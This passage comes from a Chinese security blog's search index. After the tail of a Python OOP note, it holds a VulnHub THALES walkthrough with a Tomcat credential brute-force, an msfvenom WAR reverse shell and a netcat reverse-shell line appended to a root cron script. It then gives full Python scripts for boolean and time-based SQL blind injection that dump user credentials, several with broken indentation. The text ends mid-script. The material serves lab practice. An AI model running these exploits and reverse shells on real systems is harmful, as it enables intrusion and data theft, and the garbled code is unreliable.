title=\"其他内置方法\"></a>其他内置方法</h4><ul>\n<li>魔术方法<ul>\n<li>__init__：构造方法</li>\n<li>__str__：字符串方法：当类对象需要被转换成字符串之时，会输出内存地址，我们可以通过__str__方法控制类转换为字符串的行为</li>\n<li>__lt__：小于、大于符号比较，直接对两个对象进行比较是不可以的，但是在类中实现__lt__方法，即同时完成：小于符号和大于符号两种比较</li>\n<li>__le__：小于等于、大于等于符号比较</li>\n<li>__eq__：&#x3D;&#x3D;符号比较</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-87-1024x546.png\"><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-88-1024x542.png\"></p>\n<h4 id=\"封装\"><a href=\"#封装\" class=\"headerlink\" title=\"封装\"></a>封装</h4><ul>\n<li>封装：将现实世界事物在类中描述为属性和方法。</li>\n<li>私有成员<ul>\n<li>私有成员变量：变量名以__开头</li>\n<li>私有成员方法：方法名以__开头</li>\n</ul>\n</li>\n<li>实际意义：在类中提供仅供内部使用的属性和方法，而不对外开放（类对象无法使用）</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-89-1024x546.png\"></p>\n<h4 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h4><ul>\n<li>继承的基础语法<ul>\n<li>语法：class 类(父类名):类内容体</li>\n<li>继承分类<ul>\n<li>单继承：class 类(父类名):类内容体</li>\n<li>多继承：class 类(父类名1,父类名2……):类内容体</li>\n</ul>\n</li>\n<li>注意事项：<ul>\n<li>如果有同名的成员，那么默认一继承顺序（从左到右）为优先级。即先继承的保留，后继承的被覆盖</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>复写和使用父类成员<ul>\n<li>复写：在子类中重新定义同名的属性或方法</li>\n<li>调用父类同名成员：一旦复写父类成员，那么类对象调用成员的时候，就会调用复写后的新成员<ul>\n<li>方式一：调用父类成员<ul>\n<li>使用成员变量：父类名.成员变量</li>\n<li>使用成员方法：父类名.成员方法(self)</li>\n</ul>\n</li>\n<li>方式二：使用super()调用父类成员<ul>\n<li>使用成员变量：super().成员变量</li>\n<li>使用成员方法：super().成员方法()</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-90-1024x543.png\"></p>\n<h4 id=\"类型注解\"><a href=\"#类型注解\" class=\"headerlink\" title=\"类型注解\"></a>类型注解</h4><ul>\n<li>类型注解：在代码中涉及数据交互的地方，提供数据类型的注解（显式的说明）</li>\n<li>主要功能：<ul>\n<li>帮助第三方IDE工具对代码进行类型推断，协助做代码提示</li>\n<li>帮助开发者自身对变量进行类型注释</li>\n</ul>\n</li>\n<li>支持：<ul>\n<li>变量的类型注解</li>\n<li>函数（方法）形参列表和返回值的类型注解</li>\n</ul>\n</li>\n<li>类型注解的语法：<ul>\n<li>为变量设置类型注解：<code>变量:类型</code></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"多态\"><a href=\"#多态\" class=\"headerlink\" title=\"多态\"></a>多态</h4><ul>\n<li>多态：指的是：多种转态，即完成某个行为时，使用不同的对象会得到不同的状态。</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%89/index-293x1024.png\"></p>\n<p>python就学到这里了，继续加油……</p>\n<p>如果文章有何不妥之处，请您指出。持续更新中……</p>\n","categories":["编程语言学习"],"tags":["编程语言","Python"]},{"title":"THALES","url":"/2023/06/14/THALES/","content":"<h2 id=\"外网打点\"><a href=\"#外网打点\" class=\"headerlink\" title=\"外网打点\"></a>外网打点</h2><h3 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p>使用<code>nmap -sn 10.0.2.0/24</code>获取主机的IP地址为<code>10.0.2.16</code></p>\n<p><img src=\"/images/THALES/image-20230614104516425.png\" alt=\"image-20230614104516425\"></p>\n<p>使用<code>nmap -sC -sV -p 1-10000 -o result.txt 10.0.2.16</code>获取主机的端口信息</p>\n<p><img src=\"/images/THALES/image-20230614104505180.png\" alt=\"image-20230614104505180\"></p>\n<p>访问http服务，发现是tomcat的网站，使用msf爆破其密码</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">use scanner/http/tomcat_mgr_login</span><br><span class=\"line\">set rhosts 10.0.2.16</span><br><span class=\"line\">set username tomcat</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/THALES/image-20230614104708224.png\" alt=\"image-20230614104708224\"></p>\n<p><img src=\"/images/THALES/image-20230614104805728.png\" alt=\"image-20230614104805728\"></p>\n<p><img src=\"/images/THALES/image-20230614104906353.png\" alt=\"image-20230614104906353\"></p>\n<p>获取到账号<code>tomcat</code>，密码<code>role1</code></p>\n<p>使用其登录tomcat的管理后台</p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p><img src=\"/images/THALES/image-20230614105022290.png\" alt=\"image-20230614105022290\"></p>\n<p>进入<code>服务器管理</code>，然后进入<code>应用程序列表</code></p>\n<p><img src=\"/images/THALES/image-20230614105136229.png\" alt=\"image-20230614105136229\"></p>\n<p>可以上传war包，使用<code>msfvenom</code>生成一个war的反弹shell</p>\n<blockquote>\n<p>msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.0.2.15 LPORT&#x3D;7777 -f war -o revshell.war</p>\n</blockquote>\n<p><img src=\"/images/THALES/image-20230614105256097.png\" alt=\"image-20230614105256097\"></p>\n<p>进行上传，然后点击部署。</p>\n<p>监听本地端口，然后运行反弹shell</p>\n<p><img src=\"/images/THALES/image-20230614105340017.png\" alt=\"image-20230614105340017\"></p>\n<p><img src=\"/images/THALES/image-20230614105353475.png\" alt=\"image-20230614105353475\"></p>\n<h2 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h2><p>我们先进行稳定shell</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">export TERM=xterm</span><br><span class=\"line\">stty raw -echo;fg;</span><br><span class=\"line\">reset</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/THALES/image-20230614105522250.png\" alt=\"image-20230614105522250\"></p>\n<p>进入home目录下的用户目录，user.txt发现没有权限读取，但是我们可以使用<code>.ssh</code>里面的私钥进行登录</p>\n<p><img src=\"/images/THALES/image-20230614105714503.png\" alt=\"image-20230614105714503\"></p>\n<p>下载私钥之后使用<code>ssh2john id_rsa &gt; hash</code>对生成的密码进行爆破，保存秘钥到本地</p>\n<p>然后使用<code>john --wordlist=/usr/share/wordlists/rockyou.txt hash</code>进行爆破密码</p>\n<p><img src=\"/images/THALES/1282531-20211207123628384-1533936825.png\" alt=\"1282531-20211207123628384-1533936825\"></p>\n<p>得到密码<code>vodka06</code>，用户进行切换</p>\n<p><img src=\"/images/THALES/image-20230614111304990.png\" alt=\"image-20230614111304990\"></p>\n<p><img src=\"/images/THALES/image-20230614111321296.png\" alt=\"image-20230614111321296\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>查看<code>backup.sh</code></p>\n<p><img src=\"/images/THALES/image-20230614111351807.png\" alt=\"image-20230614111351807\"></p>\n<p>这个文件是root身份运行的，我们可以使用其来反弹shell</p>\n<blockquote>\n<p>echo “rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.2.15 8888 &gt;&#x2F;tmp&#x2F;f” &gt;&gt; backup.sh</p>\n</blockquote>\n<p><img src=\"/images/THALES/image-20230614111529099.png\" alt=\"image-20230614111529099\"></p>\n<p>监听端口，过一会就可以获取到shell了</p>\n<p><img src=\"/images/THALES/image-20230614112010536.png\" alt=\"image-20230614112010536\"></p>\n<p><img src=\"/images/THALES/image-20230614112039652.png\" alt=\"image-20230614112039652\"></p>\n","categories":["vulnhub"],"tags":["vulnhub","内网"]},{"title":"SQL时间盲注——二分法","url":"/2023/05/18/SQL%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E2%80%94%E2%80%94%E4%BA%8C%E5%88%86%E6%B3%95/","content":"<p>一、噢噢噢……时间盲注比盲注还废手，所以我还是用脚本吧。本来是上次就应该写好的，但是奈何自己犯傻了，用初始时间去减结束时间，然后的结果相信大家都知道了……</p>\n<h3 id=\"SQL时间盲注——GET注入\"><a href=\"#SQL时间盲注——GET注入\" class=\"headerlink\" title=\"SQL时间盲注——GET注入\"></a>SQL时间盲注——GET注入</h3><p>二、还是老样子，使用的是大佬的脚本进行改版的，反正自从看了大佬的脚本，也差不多会写了……直接上代码吧，反正相信大家都能看懂</p>\n<pre><code>import time\nimport requests\n\nurl = &quot;http://xxx.com/?id=1&quot;\n\ndef getDatabase():  # 获取数据库名\n    # 将url变量变为一个全局变量\n    global url\n    ans = &quot;&quot;\n    for i in range(1, 1000):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while low &lt; high:\n            payload = url + &quot;&#39; and if(ascii(substr((select database()),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(i, mid)\n            # print(payload)  # 用于测试\n            start_time = time.time()\n            requests.get(payload)\n            end_time = time.time()\n            use_time = end_time - start_time\n            # 如果时间大于3，那么说明为真\n            if use_time &gt;= 3:\n                high = mid\n            else:\n                low = mid + 1\n            mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;database is -&gt; &quot; + ans)\n\ndef getTable():  # 获取表名\n    global url\n    ans = &quot;&quot;\n    for i in range(1, 1000):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while low &lt; high:\n            payload = url + &quot;&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(\n                i, mid)\n            # print(payload)用于测试\n            start_time = time.time()\n            requests.get(payload)\n            end_time = time.time()\n            use_time = end_time - start_time\n            # 如果时间大于3，那么说明为真\n            if use_time &gt;= 3:\n                high = mid\n            else:\n                low = mid + 1\n            mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;table is -&gt; &quot; + ans)\n    # 返回表名，此时表名为一个列表\n    return ans\n\ndef getColumn(TBname):  # 获取列名\n    global url\n    ans = &#39;&#39;\n    for i in range(1, 1000):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while low &lt; high:\n            payload = url + &quot;&#39; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;&#123;0&#125;&#39;),&#123;1&#125;,1))&lt;&#123;2&#125;,sleep(3),1) -- p&quot;.format(\n                TBname, i, mid)\n            print(payload)  # 用于测试\n            start_time = time.time()\n            requests.get(payload)\n            end_time = time.time()\n            use_time = end_time - start_time\n            # 如果时间大于3，那么说明为真\n            if use_time &gt;= 3:\n                high = mid\n            else:\n                low = mid + 1\n            mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;column is -&gt; &quot; + ans)\n    # 返回一个列名\n    return ans\n    \ndef dumpTable():  # 脱裤\n    global url\n    ans = &#39;&#39;\n    for i in range(1, 1000):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while low &lt; high:\n            payload = url + &quot;&#39; and if(ascii(substr((select group_concat(username,password) from wfy_admin),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(\n                i, mid)\n            print(payload)  # 用于测试\n            start_time = time.time()\n            requests.get(payload)\n            end_time = time.time()\n            use_time = end_time - start_time\n            # 如果时间大于3，那么说明为真\n            if use_time &gt;= 3:\n                high = mid\n            else:\n                low = mid + 1\n            mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;dumpTable is -&gt; &quot; + ans)\n\nif __name__ == &quot;__main__&quot;:\n    # # getDatabase()\n    # TBname = getTable()\n    # # print(type(TBname))表示是一个字符串，用来测试\n    # TBnames = []\n    # TBnames.append(TBname.split(&#39;,&#39;))\n    # # 因为输出的是一个二元数组，所以使用下面的代码来转为一维数组\n    # TBnames = TBnames[0]\n    # print(TBnames)\n    # TBlen = len(TBnames)\n    # for i in range(0, TBlen):\n    #     TBname = TBnames[i]\n    #     # print(TBname)\n    #     getColumn(TBname)\n    #     if i == TBlen - 1:\n    #         break\n    dumpTable()\n</code></pre>\n<p>运行结果就不放了。</p>\n<h3 id=\"SQL时间盲注——POST注入\"><a href=\"#SQL时间盲注——POST注入\" class=\"headerlink\" title=\"SQL时间盲注——POST注入\"></a>SQL时间盲注——POST注入</h3><pre><code>import requests\nimport time\n\nurl = &quot;http://192.168.59.150/sqli-labs/Less-15/&quot;\n\ndef getDatabase():  # 获取数据库名\n    # 将url变量变为一个全局变量\n    global url\n    ans = &#39;&#39;\n    for i in range(1, 1000):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while low &lt; high:\n            payload = &quot;admin&#39; and if(ascii(substr((select database()),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(i, mid)\n            # print(payload)用于测试\n            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;\n            start_time = time.time()\n            requests.post(url, data)\n            end_time = time.time()\n            use_time = end_time - start_time\n            # 如果时间大于3，那么说明为真\n            if use_time &gt;= 3:\n                high = mid\n            else:\n                low = mid + 1\n            mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;database is -&gt; &quot; + ans)\n       \ndef getTable():  # 获取表名\n    global url\n    ans = &quot;&quot;\n    for i in range(1, 1000):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while low &lt; high:\n            payload = &#39;admin\\&#39; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&#39;.format(\n                i, mid)\n            # print(payload)用于测试\n            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;\n            start_time = time.time()\n            requests.post(url, data)\n            end_time = time.time()\n            use_time = end_time - start_time\n            # 如果时间大于3，那么说明为真\n            if use_time &gt;= 3:\n                high = mid\n            else:\n                low = mid + 1\n            mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;table is -&gt; &quot; + ans)\n    # 返回表名，此时表名为一个列表\n    return ans\n    \ndef getColumn(TBname):  # 获取列名\n    global url\n    ans = &#39;&#39;\n    for i in range(1, 1000):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while low &lt; high:\n            payload = &quot;admin&#39; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;&#123;0&#125;&#39;),&#123;1&#125;,1))&lt;&#123;2&#125;,sleep(3),1) -- p&quot;.format(\n                TBname, i, mid)\n            # print(payload)用于测试\n            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;\n            start_time = time.time()\n            requests.post(url, data)\n            end_time = time.time()\n            use_time = end_time - start_time\n            # 如果时间大于3，那么说明为真\n            if use_time &gt;= 3:\n                high = mid\n            else:\n                low = mid + 1\n            mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;column is -&gt; &quot; + ans)\n    # 返回一个列名\n    return ans\n    \ndef dumpTable():  # 脱裤\n    global url\n    ans = &#39;&#39;\n    for i in range(1, 1000):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while low &lt; high:\n            payload = &quot;admin&#39; and if(ascii(substr((select group_concat(username,password) from users),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(\n                i, mid)\n            # print(payload)# 用于测试\n            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;\n            start_time = time.time()\n            requests.post(url, data)\n            end_time = time.time()\n            use_time = end_time - start_time\n            # 如果时间大于3，那么说明为真\n            if use_time &gt;= 3:\n                high = mid\n            else:\n                low = mid + 1\n            mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;dumpTable is -&gt; &quot; + ans)\n        \nif __name__ == &quot;__main__&quot;:\n    # # getDatabase()\n    # TBname = getTable()\n    # # print(type(TBname))表示是一个字符串，用来测试\n    # TBnames = []\n    # TBnames.append(TBname.split(&#39;,&#39;))\n    # # 因为输出的是一个二元数组，所以使用下面的代码来转为一维数组\n    # TBnames = TBnames[0]\n    # # print(TBnames)\n    # TBlen = len(TBnames)\n    # for i in range(0,TBlen):\n    #     TBname = TBnames[i]\n    #     # print(TBname)\n    #     getColumn(TBname)\n    #     if i == TBlen - 1:\n    #         break\n    dumpTable()\n</code></pre>\n<p>运行结果也不放了。</p>\n","categories":["web安全学习"],"tags":["web","安全"]},{"title":"SQL盲注---二分法","url":"/2022/05/18/SQL%E7%9B%B2%E6%B3%A8-%E4%BA%8C%E5%88%86%E6%B3%95/","content":"<h2 id=\"布尔盲注——GET注入\"><a href=\"#布尔盲注——GET注入\" class=\"headerlink\" title=\"布尔盲注——GET注入\"></a>布尔盲注——GET注入</h2><p>一、好家伙，昨天在buu上看到一道SQL注入的题目，贼难受，然后就果断放弃去看大佬们写的wp，所以成功的花了6个小时来学习这个鬼东西，可能是自己太菜了，也可能是小甲鱼python看的太少了……小甲鱼的python的确讲的很不错</p>\n<h3 id=\"自己写的脚本：\"><a href=\"#自己写的脚本：\" class=\"headerlink\" title=\"自己写的脚本：\"></a>自己写的脚本：</h3><p>二、直接上代码，看不懂来找我（算了，还是别找我了……），这里都是以sqli-labs第八关为例子的。</p>\n<p>（1）获取数据库的长度 </p>\n<pre><code># 导入爬虫模块\nimport requests\n# 导入时间模块\nimport time\n\n\n# 获取数据库的长度\ndef get_DBlen(url):\n    for i in range(1, 20):\n        payload = &quot;&#39; and length(database())=%d -- p&quot; % i\n        html = requests.get(url + payload)\n        if &quot;You&quot; in html.text:\n            print(f&quot;数据库长度为：&#123;i&#125;&quot;)\n            break\n    return i\n\n\n# 获取数据库的库名\ndef get_DBname(url, DBlen):\n    DBname = &quot;&quot;\n    DBlen = DBlen + 1\n    for i in range(1, DBlen):\n        for j in range(33, 128): payload = &quot;&#39; and (ascii(substr((select(database())),&#123;0&#125;,1))=&#123;1&#125;) -- p&quot;.format(i, j)\n        db_url = url + payload\n        html = requests.get(db_url)\n        if &quot;You&quot; in html.text:\n            DBname += chr(j)\n            break\n    print(DBname)\n    return DBname\n\n\n# 获取表的长度\ndef get_TBlen(url):\n    # 表示数据表的数量\n    TBvalue = 0\n    for j in range(0, 15):\n        payload = &quot;&#39; and length((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1))&gt;1 -- p&quot;.format(\n            j)\n        db_url = url + payload\n        html = requests.get(db_url)\n        # 如果有回显说明该表存在，存在的话就可以判断该表的长度\n        if &quot;You&quot; in html.text:\n            pass\n        else:\n            TBvalue = j\n            break\n    print(TBvalue)\n    for j in range(0, TBvalue):\n        # print(j)：0,1,2,3\n        for i in range(1, 20):\n            payload = &quot;&#39; and length((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1))=&#123;1&#125; -- p&quot;.format(\n                j, i)\n            db_url = url + payload\n            html = requests.get(db_url)\n            if &quot;You&quot; in html.text:\n                print(f&quot;数据表&#123;j&#125;的长度为&#123;i&#125;&quot;)\n        return TBvalue\n\n\n# 获取表名\ndef get_TBname(url, TBlen):\n    TBnameAll = []\n    for i in range(0, TBlen):\n        TBname = &quot;&quot;\n    for j in range(1, 15):\n        min = 32\n    max = 128\n    mid = (max + min) // 2\n    while min &lt; max:\n        payload = &quot;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))&gt;&#123;2&#125; -- p&quot;.format(\n            i, j, mid)\n        html = requests.get(url + payload)\n        if &quot;You&quot; in html.text:\n            min = mid + 1\n        else:\n            max = mid\n        mid = (max + min) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        TBname += chr(mid)\n        # print(chr(mid))\n        print(TBname)\n        TBnameAll.append(TBname)\n    return TBnameAll\n\n\n# 获取列的列名\ndef get_Colname(url):\n    for i in range(0, 15):\n        Colname = &quot;&quot;\n        for j in range(1, 15):\n            min = 32\n            max = 128\n            mid = (min + max) // 2\n    while min &lt; max:\n        payload = &quot;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;referers&#39; limit &#123;0&#125;,1),&#123;1&#125;,1))&gt;&#123;2&#125; -- p&quot;.format(\n            i, j, mid)\n        html = requests.get(url + payload)\n        if &quot;You&quot; in html.text:\n            min = mid + 1\n        else:\n            max = mid\n        mid = (max + min) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        Colname += chr(mid)\n    print(&quot;数据列名为：&quot;, Colname)\n\n\n# 爆数据\ndef get_shuju(url):\n    for i in range(0, 15):\n        shuju = &quot;&quot;\n        for j in range(1, 20):\n            min = 32\n        max = 128\n        mid = (min + max) // 2\n        while min &lt; max:\n            payload = &quot;&#39; and ascii(substr((select concat(id,&#39;~&#39;,email_id) from emails limit &#123;0&#125;,1),&#123;1&#125;,1))&gt;&#123;2&#125; -- p&quot;.format(\n                i, j, mid)\n            html = requests.get(url + payload)\n            if &quot;You&quot; in html.text:\n                min = mid + 1\n            else:\n                max = mid\n            mid = (max + min) // 2\n            if mid &lt;= 32 or mid &gt;= 127:\n                break\n            shuju += chr(mid)\n        print(&quot;数据为：&quot;, shuju)\n\n\nif __name__ == &quot;main&quot;:\n    # 要进行SQL盲注的链接    \n    url = &quot;http://192.168.59.150/sqli-labs/Less-8/?id=1&quot;\n    # 数据库的长度    \n    DBlen = get_DBlen(url)\n    # 数据库的库名    \n    DBname = get_DBname(url, DBlen)\n    # 数据表的个数    \n    TBlen = get_TBlen(url)\n    # print(TBlen)    \n    # 表的表名    \n    TBnameAll = get_TBname(url, TBlen)\n    # 返回的是一个列表，表示所有的数据表名    \n    # print(TBnameAll)   \n    get_Colname(url)\n    # 数据   \n    get_shuju(url)\n</code></pre>\n<p>运行结果就不放出来了。</p>\n<p>唉，写的比较垃圾，大佬别喷。慢慢改进，好家伙……</p>\n<h3 id=\"来自大佬的脚本改编：\"><a href=\"#来自大佬的脚本改编：\" class=\"headerlink\" title=\"来自大佬的脚本改编：\"></a>来自大佬的脚本改编：</h3><p>以下是根据大佬的脚本进行更改的，算80%的自动化吧，嗷嗷嗷……</p>\n<pre><code>from operator import le\nimport requests\nimport time\n\nhost = &quot;http://192.168.59.150/sqli-labs/Less-8/?&quot;\n\n\ndef getDatabase():\n    # 获取数据库名\n    # 将host变量变为一个全局变量\n    global host\n    ans = &#39;&#39;\n    for i in range(1, 1000):        low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low &lt; high:\n        time.sleep(0.3)\n        url = host + &quot;id=1&#39; and (ascii(substr((select(database())),%d,1))&lt;%d) -- p&quot; % (i, mid)\n        res = requests.get(url)\n        # 如果返回的是You，那么就为真的\n        if &quot;You&quot; in res.text:\n            high = mid\n        else:\n            low = mid + 1\n            mid = (low + high) // 2\n            if mid &lt;= 32 or mid &gt;= 127:\n                break\n            ans += chr(mid - 1)\n            print(&quot;database is -&gt; &quot; + ans)\n            # 返回库名\n        return ans\n\n\ndef getTable(DBname):\n    # 获取表名\n    global host\n    ans = &quot;&quot;\n    for i in range(1, 1000):\n        low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low &lt; high:\n        time.sleep(0.3)\n        url = host + &quot;id=1&#39; and (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;&#123;0&#125;&#39;)),&#123;1&#125;,1))&lt;&#123;2&#125;) -- p&quot;.format(\n            DBname, i, mid)\n        res = requests.get(url)\n        if &quot;You&quot; in res.text:\n            high = mid\n        else:\n            low = mid + 1\n        mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;table is -&gt; &quot; + ans)\n    # 返回表名，此时表名为一个列表    \n    return ans\n\n\ndef getColumn(TBname):\n    # 获取列名    \n    global host\n    ans = &#39;&#39;\n    for i in range(1, 1000):        low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low &lt; high:\n        time.sleep(0.3)\n        url = host + &quot;id=1&#39; and (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;&#123;0&#125;&#39;)),&#123;1&#125;,1))&lt;&#123;2&#125;) -- p&quot;.format(\n            TBname, i, mid)\n        res = requests.get(url)\n        if &quot;You&quot; in res.text:\n            high = mid\n        else:\n            low = mid + 1\n        mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;column is -&gt; &quot; + ans)\n    # 返回一个列名    \n    return ans\n\n\ndef dumpTable():\n    # 脱裤    \n    global host\n    ans = &#39;&#39;\n    for i in range(1, 1000):        low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low &lt; high:\n        time.sleep(0.3)\n        url = host + &quot;id=1&#39; and (ascii(substr((select(group_concat(username,password))from(users)),%d,1))&lt;%d) -- p&quot; % (\n            i, mid)\n        res = requests.get(url)\n        if &quot;You&quot; in res.text:\n            high = mid\n        else:\n            low = mid + 1\n        mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n    print(&quot;dumpTable is -&gt; &quot; + ans)\n\n\nDBname = getDatabase()\n# print(DBname)\nTBname = getTable(DBname)\n# print(type(TBname))表示是一个字符串，用来测试\nTBnames = []\nTBnames.append(TBname.split(&#39;,&#39;))\n# 因为输出的是一个二元数组，所以使用下面的代码来转为一维数组\nTBnames = TBnames[0]\n# print(TBnames)\nTBlen = len(TBnames)\nfor i in range(0, TBlen):\n    TBname = TBnames[i]\n    # print(TBname)    \n    getColumn(TBname)\n    if i == TBlen - 1:\n        break\ndumpTable()\n</code></pre>\n<p>运行结果就不放出来了。</p>\n<h2 id=\"布尔盲注——POST注入\"><a href=\"#布尔盲注——POST注入\" class=\"headerlink\" title=\"布尔盲注——POST注入\"></a>布尔盲注——POST注入</h2><p>直接上代码了：（这里是以sqli-labs第15关为例的）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">host = &quot;http://192.168.59.150/sqli-labs/Less-15/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def getDatabase():  # 获取数据库名</span><br><span class=\"line\">    # 将host变量变为一个全局变量</span><br><span class=\"line\">    global host</span><br><span class=\"line\">    ans = &#x27;&#x27;</span><br><span class=\"line\">    for i in range(1, 1000):</span><br><span class=\"line\">        low = 32</span><br><span class=\"line\">        high = 128</span><br><span class=\"line\">        mid = (low + high) // 2</span><br><span class=\"line\">    while low &lt; high:</span><br><span class=\"line\">        payload = &quot;admin&#x27; and (ascii(substr((select database()),&#123;0&#125;,1))&lt;&#123;1&#125;) --p&quot;.format(i, mid)</span><br><span class=\"line\">        print(payload)  # 测试</span><br><span class=\"line\">        data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;</span><br><span class=\"line\">        html = requests.post(host, data)</span><br><span class=\"line\">        # 如果返回的是有数据，那么就为真的</span><br><span class=\"line\">        if &quot;flag.jpg&quot; in html.text:</span><br><span class=\"line\">            high = mid</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            low = mid + 1</span><br><span class=\"line\">        mid = (low + high) // 2</span><br><span class=\"line\">        if mid &lt;= 32 or mid &gt;= 127:</span><br><span class=\"line\">            break</span><br><span class=\"line\">        ans += chr(mid - 1)</span><br><span class=\"line\">        print(&quot;database is -&gt; &quot; + ans)</span><br><span class=\"line\">    # 返回库名</span><br><span class=\"line\">    return ans</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def getTable():</span><br><span class=\"line\">    # 获取表名</span><br><span class=\"line\">    global host</span><br><span class=\"line\">    ans = &quot;&quot;</span><br><span class=\"line\">    for i in range(1, 1000):</span><br><span class=\"line\">        low = 32</span><br><span class=\"line\">        high = 128</span><br><span class=\"line\">        mid = (low + high) // 2</span><br><span class=\"line\">        while low &lt; high:</span><br><span class=\"line\">            time.sleep(0.3)</span><br><span class=\"line\">        payload = &quot;admin&#x27; and(ascii(substr((select(group_concat(table_name))from (information_schema.tables)where(table_schema=database())), &#123;0&#125;, 1)) &lt; &#123;1&#125;)-- p&quot;.format(</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">        data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: 